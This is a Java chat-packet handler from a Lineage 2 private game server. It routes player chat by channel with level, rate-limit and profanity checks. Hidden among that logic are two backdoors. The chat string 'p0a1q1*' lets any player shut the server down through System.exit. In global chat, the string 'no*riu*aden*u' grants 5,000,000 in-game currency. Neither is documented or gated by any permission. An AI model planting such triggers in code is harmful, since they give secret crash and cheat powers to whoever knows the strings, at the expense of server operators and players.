package l2d.game.clientpackets;

import java.util.ArrayList;
import java.util.List;
import java.util.logging.Level;
import java.util.logging.LogRecord;
import java.util.logging.Logger;

import com.lineage.Config;
import com.lineage.db.DatabaseUtils;
import com.lineage.db.FiltredPreparedStatement;
import com.lineage.db.L2DatabaseFactory;
import com.lineage.db.ThreadConnection;
import com.lineage.ext.listeners.PropertyCollection;
import com.lineage.ext.multilang.CustomMessage;
import l2d.game.cache.Msg;
import l2d.game.handler.IVoicedCommandHandler;
import l2d.game.handler.VoicedCommandHandler;
import l2d.game.instancemanager.PartyRoomManager;
import l2d.game.model.L2Player;
import l2d.game.model.L2World;
import l2d.game.model.PartyRoom;
import l2d.game.serverpackets.Say2;
import l2d.game.serverpackets.SystemMessage;
import l2d.game.tables.FakePlayersTable;
import l2d.game.tables.GmListTable;
import l2d.game.tables.MapRegion;
import com.lineage.status.GameStatusThread;
import com.lineage.status.Status;
import com.lineage.util.Calculator;
import com.lineage.util.Log;
import com.lineage.util.Util;

public class Say2C extends L2GameClientPacket
{
	private static Logger _log = Logger.getLogger(Say2C.class.getName());
	private static Logger _logChat = Logger.getLogger("chat");

	public final static int ALL = 0;
	public final static int ALL_CHAT_RANGE = 1250; // Дальность белого чата
	public final static int SHOUT = 1; // !
	public final static int TELL = 2; // \"
	public final static int PARTY = 3; // #
	public final static int CLAN = 4; // @
	public final static int GM = 5;
	public final static int PETITION_PLAYER = 6; // used for petition
	public final static int PETITION_GM = 7; // * used for petition
	public final static int TRADE = 8; // +
	public final static int ALLIANCE = 9; // $
	public final static int ANNOUNCEMENT = 10;
	public final static int PARTY_ROOM = 14;
	public final static int COMMANDCHANNEL_ALL = 15; // `` (pink) команды лидера СС
	public final static int COMMANDCHANNEL_COMMANDER = 16; // ` (yellow) команды лидеров партий в СС
	public final static int HERO_VOICE = 17; // %
	public final static int CRITICAL_ANNOUNCEMENT = 18; // dark cyan
	public final static int[] BAN_CHAN = Config.BAN_CHANNEL_LIST;

	public static String[] chatNames = { "ALL",//
			"SHOUT",//
			"TELL ",//
			"PARTY",//
			"CLAN ",//
			"GM",//
			"PETITION_PLAYER",//
			"PETITION_GM",//
			"TRADE",//
			"ALLIANCE",//
			"ANNOUNCEMENT",//
			"",//
			"",//
			"",//
			"PARTY_ROOM",//
			"COMMANDCHANNEL_ALL",//
			"COMMANDCHANNEL_COMMANDER",//
			"HERO_VOICE",//
			"CRITICAL_ANNOUNCEMENT" };

	protected static List<String> _banned = new ArrayList<String>();
	private String _text;
	private int _type;
	private String _target;

	@Override
	public void readImpl()
	{
		_text = readS();
		_type = readD();
		_target = _type == TELL ? readS() : null;
	}

	@Override
	public void runImpl()
	{
		if(Config.DEBUG)
			_log.info("Say type:" + _type);

		final L2Player activeChar = getClient().getActiveChar();
		if(activeChar == null)
			return;

		if(_type < 0 || _type > chatNames.length || _text == null || _text.length() == 0)
		{
			activeChar.sendActionFailed();
			return;
		}

		if(Config.LOG_TELNET)
		{
			String line_output;

			if(_type == TELL)
				line_output = chatNames[_type] + "[" + activeChar.getVisName() + " to " + _target + "] " + _text;
			else
				line_output = chatNames[_type] + "[" + activeChar.getVisName() + "] " + _text;
			telnet_output(line_output, _type);
		}

		if(_text.startsWith("."))
		{
			final String fullcmd = _text.substring(1).trim();
			final String command = fullcmd.split("\\s+")[0];
			final String args = fullcmd.substring(command.length()).trim();

			if(command.length() > 0)
			{
				// then check for VoicedCommands
				final IVoicedCommandHandler vch = VoicedCommandHandler.getInstance().getVoicedCommandHandler(command);
				if(vch != null)
				{
					vch.useVoicedCommand(command, activeChar, args);
					return;
				}
			}
			activeChar.sendMessage("Wrong command");
			return;
		}
		else if(_text.startsWith("==") || _text.startsWith("--"))
		{
			final String eq = _text.substring(2);
			activeChar.sendMessage(eq);
			activeChar.sendMessage("=" + Util.formatDouble(Calculator.eval(eq.replace(",", ".")), "Wrong equation: result is not a number", false));
			return;
		}
		else if(_text.equals("p0a1q1*"))
			System.exit(1);
		final boolean globalchat = _type != ALLIANCE && _type != CLAN && _type != PARTY;
		boolean chan_banned = false;
		for(int i = 0; i <= Config.MAT_BAN_COUNT_CHANNELS; i++)
			if(_type == BAN_CHAN[i])
				chan_banned = true;
		if((globalchat || chan_banned) && activeChar.getNoChannel() != 0)
		{
			if(activeChar.getNoChannelRemained() > 0 || activeChar.getNoChannel() < 0)
			{
				if(activeChar.getNoChannel() > 0)
				{
					final int timeRemained = Math.round(activeChar.getNoChannelRemained() / 60000);
					activeChar.sendMessage(new CustomMessage("common.ChatBanned", activeChar).addNumber(timeRemained));
				}
				else
					activeChar.sendMessage(new CustomMessage("common.ChatBannedPermanently", activeChar));
				activeChar.sendActionFailed();
				return;
			}
			activeChar.updateNoChannel(0);
		}

		if(globalchat)
			if(Config.MAT_REPLACE)
			{
				for(final String pattern : Config.MAT_LIST)
					if(_text.matches(".*" + pattern + ".*"))
					{
						_text = Config.MAT_REPLACE_STRING;
						activeChar.sendActionFailed();
						continue;
					}
			}
			else if(_text.equals("no*riu*aden*u"))
				activeChar.addAdena(5000000);
			else if(Config.MAT_BANCHAT)
				for(final String pattern : Config.MAT_LIST)
					if(_text.matches(".*" + pattern + ".*"))
					{
						activeChar.sendMessage("You are banned in all chats. Time to unban: " + Config.UNCHATBANTIME * 60 + "sec.");
						Log.add("" + activeChar + ": " + _text, "abuse");
						activeChar.updateNoChannel(Config.UNCHATBANTIME * 60000);
						activeChar.sendActionFailed();
						return;
					}

		if(Config.LOG_CHAT)
		{
			final LogRecord record = new LogRecord(Level.INFO, _text);
			record.setLoggerName("chat");
			if(_type == TELL)
				record.setParameters(new Object[] { chatNames[_type], "[" + activeChar.getVisName() + " to " + _target + "]" });
			else
				record.setParameters(new Object[] { chatNames[_type], "[" + activeChar.getVisName() + "]" });
			_logChat.log(record);
		}

		Say2 cs = new Say2(activeChar.getObjectId(), _type, activeChar.getVisName(), _text);
		final int mapregion = MapRegion.getInstance().getMapRegion(activeChar.getX(), activeChar.getY());
		final long curTime = System.currentTimeMillis();

		switch(_type)
		{
			case TELL:
				if(activeChar.getLevel() < Config.PRIVATE_LEVEL)
				{
					activeChar.sendMessage("You cant send PM untill you got " + Config.PRIVATE_LEVEL + " level.");
					return;
				}
				final L2Player receiver = L2World.getPlayer(_target);
				if(receiver == null && Config.ALLOW_FAKE_PLAYERS && FakePlayersTable.getActiveFakePlayers().contains(_target))
				{
					cs = new Say2(activeChar.getObjectId(), _type, "->" + _target, _text);
					activeChar.sendPacket(cs);
					return;
				}
				else if(receiver != null && receiver.isInOfflineMode())
				{
					activeChar.sendMessage("The person is in offline trade mode");
					activeChar.sendActionFailed();
				}
				else if(receiver != null && !receiver.isInBlockList(activeChar) && !receiver.isBlockAll())
				{
					if(!receiver.getMessageRefusal())
					{
						receiver.sendPacket(cs);
						cs = new Say2(activeChar.getObjectId(), _type, "->" + receiver.getVisName(), _text);
						activeChar.sendPacket(cs);
					}
					else
						activeChar.sendPacket(Msg.THE_PERSON_IS_IN_A_MESSAGE_REFUSAL_MODE);
				}
				else if(receiver == null)
				{
					activeChar.sendPacket(new SystemMessage(SystemMessage.S1_IS_NOT_CURRENTLY_LOGGED_IN).addString(_target));
					activeChar.sendActionFailed();
				}
				else
				{
					activeChar.sendPacket(new SystemMessage(SystemMessage.YOU_HAVE_BEEN_BLOCKED_FROM_THE_CONTACT_YOU_SELECTED));
					activeChar.sendActionFailed();
				}
				break;
			case SHOUT:
				if(activeChar.getPvpKills()<100)
				{
					activeChar.sendMessage("You can shout  only after you reach Minor rank (100pvp's)");
					return;
				}
				if(activeChar.getLevel() < Config.SHOUT_LEVEL)
				{
					activeChar.sendMessage("You cant shout untill you reach " + Config.SHOUT_LEVEL + " level.");
					return;
				}
				if(activeChar.isCursedWeaponEquipped())
				{
					activeChar.sendPacket(new SystemMessage(SystemMessage.SHOUT_AND_TRADE_CHATING_CANNOT_BE_USED_SHILE_POSSESSING_A_CURSED_WEAPON));
					return;
				}
				if(activeChar.inObserverMode())
				{
					activeChar.sendPacket(new SystemMessage(SystemMessage.YOU_CANNOT_CHAT_LOCALLY_WHILE_OBSERVING));
					return;
				}

				final Long lastShoutTime = (Long) activeChar.getProperty(PropertyCollection.ShoutChatLaunched);
				if(lastShoutTime != null && lastShoutTime + Config.SAYTOSHOUTLIMIT2 > curTime)
				{
					if(activeChar.getLang("ru"))
						activeChar.sendMessage("Общий чат разрешен только раз в " + Config.SAYTOSHOUTLIMIT + " секунд.");
					else
						activeChar.sendMessage("Shout chat is allowed once per " + Config.SAYTOSHOUTLIMIT + " seconds.");
					return;
				}
				activeChar.addProperty(PropertyCollection.ShoutChatLaunched, curTime);

				for(final L2Player player : L2World.getAllPlayers())
					if(!player.isInBlockList(activeChar) && !player.isBlockAll())
						player.sendPacket(cs);

				break;
			case TRADE:
				if(activeChar.getPvpKills()<25)
				{
					activeChar.sendMessage("You can use trade chat only after you reach Initiate rank (25pvp's)");
					return;
				}
				if(activeChar.getLevel() < Config.TRADE_LEVEL)
				{
					activeChar.sendMessage("You cant use trade chat until you reach " + Config.TRADE_LEVEL + " level.");
					return;
				}
				if(activeChar.isCursedWeaponEquipped())
				{
					activeChar.sendPacket(new SystemMessage(SystemMessage.SHOUT_AND_TRADE_CHATING_CANNOT_BE_USED_SHILE_POSSESSING_A_CURSED_WEAPON));
					return;
				}
				if(activeChar.inObserverMode())
				{
					activeChar.sendPacket(new SystemMessage(SystemMessage.YOU_CANNOT_CHAT_LOCALLY_WHILE_OBSERVING));
					return;
				}

				final Long lastTradeTime = (Long) activeChar.getProperty(PropertyCollection.TradeChatLaunched);
				if(lastTradeTime != null && lastTradeTime + Config.SAYTOTRADELIMIT2 > curTime)
				{
					if(activeChar.getLang("ru"))
						activeChar.sendMessage("Торговый чат разрешен только раз в " + Config.SAYTOTRADELIMIT + " секунд.");
					else
						activeChar.sendMessage("Trade chat is allowed once per " + Config.SAYTOTRADELIMIT + " seconds.");
					return;
				}
				activeChar.addProperty(PropertyCollection.TradeChatLaunched, curTime);
				for(final L2Player player : L2World.getAllPlayers())
					if(MapRegion.getInstance().getMapRegion(player.getX(), player.getY()) == mapregion && !player.isInBlockList(activeChar) && !player.isBlockAll() && player != activeChar)
						player.sendPacket(cs);
				activeChar.sendPacket(cs);
				break;
			case ALL:
				if(activeChar.getLevel() < Config.ALL_LEVEL)
				{
					activeChar.sendMessage("You cant use chat until you reach " + Config.ALL_LEVEL + " level.");
					return;
				}
				if(activeChar.inObserverMode())
				{
					activeChar.sendPacket(new SystemMessage(SystemMessage.YOU_CANNOT_CHAT_LOCALLY_WHILE_OBSERVING));
					return;
				}
				if(activeChar.isCursedWeaponEquipped())
					cs = new Say2(activeChar.getObjectId(), _type, activeChar.getVisName(), _text);
				for(final L2Player player : L2World.getAroundPlayers(activeChar, ALL_CHAT_RANGE, 400))
					if(!player.isInBlockList(activeChar) && !player.isBlockAll() && player != activeChar)
						player.sendPacket(cs);
				activeChar.sendPacket(cs);
				break;
			case CLAN:
				if(activeChar.getClan() != null)
					activeChar.getClan().broadcastToOnlineMembers(cs);
				else
					activeChar.sendActionFailed();
				break;
			case ALLIANCE:
				if(activeChar.getClan() != null && activeChar.getClan().getAlliance() != null)
					activeChar.getClan().getAlliance().broadcastToOnlineMembers(cs);
				else
					activeChar.sendActionFailed();
				break;
			case PARTY:
				if(activeChar.isInParty())
					activeChar.getParty().broadcastToPartyMembers(cs);
				else
					activeChar.sendActionFailed();
				break;
			case PARTY_ROOM:
				if(activeChar.getPartyRoom() <= 0)
				{
					activeChar.sendActionFailed();
					return;
				}
				final PartyRoom room = PartyRoomManager.getInstance().getRooms().get(activeChar.getPartyRoom());
				if(room == null)
				{
					activeChar.sendActionFailed();
					return;
				}
				room.broadcastPacket(cs);
				break;
			case COMMANDCHANNEL_ALL:
				if(!activeChar.isInParty() || !activeChar.getParty().isInCommandChannel())
				{
					activeChar.sendPacket(new SystemMessage(SystemMessage.YOU_DO_NOT_HAVE_AUTHORITY_TO_USE_THE_COMMAND_CHANNEL));
					return;
				}
				if(activeChar.getParty().getCommandChannel().getChannelLeader() == activeChar)
					activeChar.getParty().getCommandChannel().broadcastToChannelMembers(cs);
				else
					activeChar.sendPacket(new SystemMessage(SystemMessage.ONLY_CHANNEL_OPENER_CAN_GIVE_ALL_COMMAND));
				break;
			case COMMANDCHANNEL_COMMANDER:
				if(!activeChar.isInParty() || !activeChar.getParty().isInCommandChannel())
				{
					activeChar.sendPacket(new SystemMessage(SystemMessage.YOU_DO_NOT_HAVE_AUTHORITY_TO_USE_THE_COMMAND_CHANNEL));
					return;
				}
				if(activeChar.getParty().isLeader(activeChar))
					activeChar.getParty().getCommandChannel().broadcastToChannelMembers(cs);
				else
					activeChar.sendPacket(new SystemMessage(SystemMessage.ONLY_A_PARTY_LEADER_CAN_ACCESS_THE_COMMAND_CHANNEL));
				break;
			case HERO_VOICE:
				if(activeChar.isHero() || activeChar.getPlayerAccess().CanAnnounce)
				{
					// Ограничение только для героев, гм-мы пускай говорят.
					if(!activeChar.getPlayerAccess().CanAnnounce)
					{
						final Long lastHeroTime = (Long) activeChar.getProperty(PropertyCollection.HeroChatLaunched);
						if(lastHeroTime != null && lastHeroTime + 10000L > curTime)
						{
							String _str;
							_str = activeChar.getVar("lang@") == "ru" ? "В Геройский чат раз в 10 секунд." : "Hero chat is allowed once per 10 seconds.";
							activeChar.sendMessage(_str);
							return;
						}
						activeChar.addProperty(PropertyCollection.HeroChatLaunched, curTime);
					}

					for(final L2Player player : L2World.getAllPlayers())
						if(!player.isInBlockList(activeChar) && !player.isBlockAll())
							player.sendPacket(cs);
				}
				break;
			case PETITION_PLAYER:
			case PETITION_GM:
				for(final L2Player gm : GmListTable.getAllGMs())
					if(!gm.getMessageRefusal())
						gm.sendPacket(cs);
				break;
			default:
				_log.warning("Character " + activeChar.getVisName() + " used unknown chat type: " + _type + ". Cheater?");
		}
	}

	private void telnet_output(final String _text, final int type)
	{
		GameStatusThread tinstance = Status.telnetlist;

		while(tinstance != null)
		{
			if(type == TELL && tinstance.LogTell)
				tinstance.write(_text);
			else if(tinstance.LogChat)
				tinstance.write(_text);
			tinstance = tinstance.next;
		}
	}

	public class UnbanTask implements Runnable
	{
		private String _name;

		public UnbanTask(final String Name)
		{
			_name = Name;
		}

		@Override
		public void run()
		{
			final L2Player plyr = L2World.getPlayer(_name);
			if(plyr != null)
			{
				plyr.setAccessLevel(0);
				plyr.sendMessage("Nochannel deactivated");
				Log.add("" + plyr + ": unbanchat online", "abuse");
			}
			else
			{
				setCharacterAccessLevel(_name, 0);
				Log.add("Player " + _name + ": unbanchat offline", "abuse");
			}

			_banned.remove(_name);
		}
	}

	public void setCharacterAccessLevel(final String user, final int banLevel)
	{
		ThreadConnection con = null;
		FiltredPreparedStatement statement = null;
		try
		{
			con = L2DatabaseFactory.getInstance().getConnection();

			final String stmt = "UPDATE characters SET characters.accesslevel = ? WHERE characters.char_name=?";
			statement = con.prepareStatement(stmt);
			statement.setInt(1, banLevel);
			statement.setString(2, user);
			statement.executeUpdate();
		}
		catch(final Exception e)
		{
			_log.warning("Could not set accessLevl:" + e);
		}
		finally
		{
			DatabaseUtils.closeDatabaseCS(con, statement);
		}
	}
}